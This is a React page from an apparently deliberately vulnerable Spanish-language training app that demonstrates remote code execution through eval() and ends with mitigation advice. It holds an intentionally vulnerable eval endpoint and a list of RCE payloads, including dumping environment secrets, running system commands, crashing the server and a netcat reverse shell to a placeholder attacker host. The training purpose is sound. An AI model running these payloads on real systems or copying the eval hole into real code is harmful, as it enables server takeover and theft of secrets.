import { useState } from 'react';
import { executeCode } from '../api';

function Eval() {
  const [code, setCode] = useState('');
  const [result, setResult] = useState(null);
  const [error, setError] = useState(null);
  const [executing, setExecuting] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setResult(null);
    setError(null);
    setExecuting(true);

    try {
      const data = await executeCode(code);
      setResult(data);
    } catch (err) {
      setError(err.message);
    } finally {
      setExecuting(false);
    }
  };

  const loadExample = (exampleCode) => {
    setCode(exampleCode);
    setResult(null);
    setError(null);
  };

  return (
    <div className="page-container">
      <h1 className="page-title">⚡ Eval - Remote Code Execution (RCE)</h1>

      <div className="vuln-info">
        <h3>🔓 VULNERABILIDAD: Remote Code Execution (RCE)</h3>
        <p>
          <strong>Problema:</strong> El backend ejecuta código JavaScript arbitrario 
          enviado por el usuario mediante la función <code>eval()</code>, permitiendo 
          la ejecución de código malicioso en el servidor.
        </p>
        <p>
          <strong>Código vulnerable (backend):</strong>
        </p>
        <div className="code-block">
          <pre>{`app.post('/eval', (req, res) => {
  const { code } = req.body;
  
  try {
    // ¡EXTREMADAMENTE PELIGROSO!
    const result = eval(code);
    res.json({ success: true, output: result });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});`}</pre>
        </div>
        <p>
          <strong>Impacto:</strong> Un atacante puede:
        </p>
        <ul style={{ marginLeft: '2rem' }}>
          <li>Ejecutar comandos del sistema operativo</li>
          <li>Leer archivos sensibles del servidor</li>
          <li>Modificar o eliminar archivos</li>
          <li>Instalar backdoors o malware</li>
          <li>Acceder a variables de entorno y secretos</li>
          <li>Comprometer completamente el servidor</li>
        </ul>
        <p>
          <strong>Mitigación:</strong> NUNCA usar <code>eval()</code> con input del 
          usuario. Si necesitas ejecutar código dinámico, usa sandboxing seguro 
          (vm2, isolated-vm), validación estricta, o rediseña la funcionalidad.
        </p>
      </div>

      <div className="card">
        <h2 className="card-title">Ejecutar Código JavaScript</h2>
        
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="code">Código JavaScript a ejecutar:</label>
            <textarea
              id="code"
              className="form-control"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              placeholder="Ingresa código JavaScript..."
              rows="8"
              required
            />
          </div>

          <button 
            type="submit" 
            className="btn btn-danger" 
            disabled={executing || !code}
          >
            {executing ? 'Ejecutando...' : '⚡ Ejecutar Código'}
          </button>
        </form>

        {result && (
          <div className="result-box result-success">
            <h3>✅ Ejecución Exitosa</h3>
            <p><strong>Input:</strong></p>
            <div className="code-block">
              <pre>{result.input}</pre>
            </div>
            <p><strong>Output:</strong></p>
            <div className="code-block">
              <pre>{typeof result.output === 'object' 
                ? JSON.stringify(result.output, null, 2) 
                : String(result.output)}
              </pre>
            </div>
            <p><strong>Tipo:</strong> {result.type}</p>
          </div>
        )}

        {error && (
          <div className="result-box result-error">
            <h3>❌ Error de Ejecución</h3>
            <p>{error}</p>
          </div>
        )}
      </div>

      <div className="card">
        <h2 className="card-title">🧪 Payloads de RCE para Probar</h2>
        
        <h3>1. Código Simple</h3>
        <div className="code-block">
          <pre>{`2 + 2`}</pre>
        </div>
        <button 
          onClick={() => loadExample('2 + 2')} 
          className="btn btn-success"
          style={{ marginBottom: '1rem' }}
        >
          Cargar Ejemplo
        </button>

        <h3>2. Información del Sistema (Node.js)</h3>
        <div className="code-block">
          <pre>{`process.platform + ' - ' + process.version`}</pre>
        </div>
        <button 
          onClick={() => loadExample("process.platform + ' - ' + process.version")} 
          className="btn btn-success"
          style={{ marginBottom: '1rem' }}
        >
          Cargar Ejemplo
        </button>

        <h3>3. Listar Variables de Entorno (Puede contener secretos)</h3>
        <div className="code-block">
          <pre>{`process.env`}</pre>
        </div>
        <button 
          onClick={() => loadExample('process.env')} 
          className="btn btn-success"
          style={{ marginBottom: '1rem' }}
        >
          Cargar Ejemplo
        </button>

        <h3>4. Ejecutar Comando del Sistema (whoami)</h3>
        <div className="code-block">
          <pre>{`require('child_process').execSync('whoami').toString()`}</pre>
        </div>
        <button 
          onClick={() => loadExample("require('child_process').execSync('whoami').toString()")} 
          className="btn btn-danger"
          style={{ marginBottom: '1rem' }}
        >
          Cargar Ejemplo (¡PELIGROSO!)
        </button>

        <h3>5. Listar Directorio Actual</h3>
        <div className="code-block">
          <pre>{`// Windows
require('child_process').execSync('dir').toString()

// Linux/Mac
require('child_process').execSync('ls -la').toString()`}</pre>
        </div>
        <button 
          onClick={() => loadExample("require('child_process').execSync('dir').toString()")} 
          className="btn btn-danger"
          style={{ marginBottom: '1rem' }}
        >
          Cargar Ejemplo Windows
        </button>
        <button 
          onClick={() => loadExample("require('child_process').execSync('ls -la').toString()")} 
          className="btn btn-danger"
          style={{ marginBottom: '1rem', marginLeft: '0.5rem' }}
        >
          Cargar Ejemplo Linux/Mac
        </button>

        <h3>6. Leer Archivo del Sistema</h3>
        <div className="code-block">
          <pre>{`require('fs').readFileSync('package.json', 'utf8')`}</pre>
        </div>
        <button 
          onClick={() => loadExample("require('fs').readFileSync('package.json', 'utf8')")} 
          className="btn btn-danger"
          style={{ marginBottom: '1rem' }}
        >
          Cargar Ejemplo
        </button>

        <h3>7. Obtener Path Actual del Servidor</h3>
        <div className="code-block">
          <pre>{`process.cwd()`}</pre>
        </div>
        <button 
          onClick={() => loadExample('process.cwd()')} 
          className="btn btn-success"
          style={{ marginBottom: '1rem' }}
        >
          Cargar Ejemplo
        </button>

        <h3>8. Crash del Servidor</h3>
        <div className="code-block">
          <pre>{`process.exit(1)`}</pre>
        </div>
        <button 
          onClick={() => loadExample('process.exit(1)')} 
          className="btn btn-danger"
          style={{ marginBottom: '1rem' }}
        >
          ⚠️ Cargar Ejemplo (Detiene el servidor)
        </button>

        <h3>9. Escribir Archivo (Backdoor)</h3>
        <div className="code-block">
          <pre>{`require('fs').writeFileSync('backdoor.txt', 'Backdoor instalado', 'utf8')`}</pre>
        </div>
        <button 
          onClick={() => loadExample("require('fs').writeFileSync('backdoor.txt', 'Backdoor instalado', 'utf8')")} 
          className="btn btn-danger"
          style={{ marginBottom: '1rem' }}
        >
          Cargar Ejemplo (¡PELIGROSO!)
        </button>

        <h3>10. Reverse Shell (Avanzado)</h3>
        <div className="code-block">
          <pre>{`// Conexión reversa a un servidor atacante
require('child_process').exec('nc -e /bin/sh attacker-ip 4444')`}</pre>
        </div>
        <p style={{ color: '#dc3545', fontWeight: 'bold' }}>
          ⚠️ NO ejecutar este payload - Es para fines de demostración únicamente
        </p>
      </div>

      <div className="card">
        <h2 className="card-title">🛡️ Prevención de RCE</h2>
        
        <h3>1. NUNCA Usar eval() con Input del Usuario</h3>
        <div className="code-block">
          <pre>{`// ❌ MAL - Nunca hacer esto
const result = eval(userInput);

// ✅ BIEN - Si necesitas parsing, usa JSON.parse o alternativas seguras
const result = JSON.parse(userInput);`}</pre>
        </div>

        <h3>2. Usar Sandboxing Seguro (si es absolutamente necesario)</h3>
        <div className="code-block">
          <pre>{`// Usar vm2 para ejecutar código en sandbox aislado
const { VM } = require('vm2');
const vm = new VM({
  timeout: 1000,
  sandbox: {}
});

try {
  const result = vm.run(userCode);
  res.json({ result });
} catch (err) {
  res.status(400).json({ error: 'Código inválido' });
}`}</pre>
        </div>

        <h3>3. Validación Estricta</h3>
        <div className="code-block">
          <pre>{`// Whitelist de operaciones permitidas
const allowedOperations = {
  'add': (a, b) => a + b,
  'subtract': (a, b) => a - b,
  'multiply': (a, b) => a * b
};

app.post('/calculate', (req, res) => {
  const { operation, a, b } = req.body;
  
  if (!allowedOperations[operation]) {
    return res.status(400).json({ error: 'Operación no permitida' });
  }
  
  const result = allowedOperations[operation](a, b);
  res.json({ result });
});`}</pre>
        </div>

        <h3>4. Principio de Mínimo Privilegio</h3>
        <ul style={{ lineHeight: '2', marginLeft: '2rem' }}>
          <li>Ejecutar la aplicación con un usuario sin privilegios</li>
          <li>Usar contenedores (Docker) con límites de recursos</li>
          <li>Implementar SELinux o AppArmor</li>
          <li>Restringir acceso al sistema de archivos</li>
        </ul>
      </div>

      <div className="alert alert-danger">
        <strong>⚠️ ADVERTENCIA CRÍTICA:</strong> Esta funcionalidad representa el riesgo 
        de seguridad más grave de toda la aplicación. RCE permite al atacante tomar 
        control total del servidor. En aplicaciones reales, funciones como <code>eval()</code>, 
        <code>Function()</code>, <code>setTimeout()</code> con strings, y 
        <code>child_process.exec()</code> con input del usuario deben ser completamente 
        evitadas.
      </div>

      <div className="alert alert-info">
        <strong>💡 Ejercicio:</strong>
        <ol style={{ marginTop: '0.5rem', paddingLeft: '2rem' }}>
          <li>Ejecuta los payloads de ejemplo y observa los resultados</li>
          <li>Intenta leer el archivo server.js del backend</li>
          <li>Lista el contenido del directorio actual del servidor</li>
          <li>Investiga sobre vm2 y cómo implementar sandboxing seguro</li>
          <li>⚠️ NO ejecutes el payload de crash ni reverse shell en un entorno que no puedas reiniciar</li>
        </ol>
      </div>
    </div>
  );
}

export default Eval;
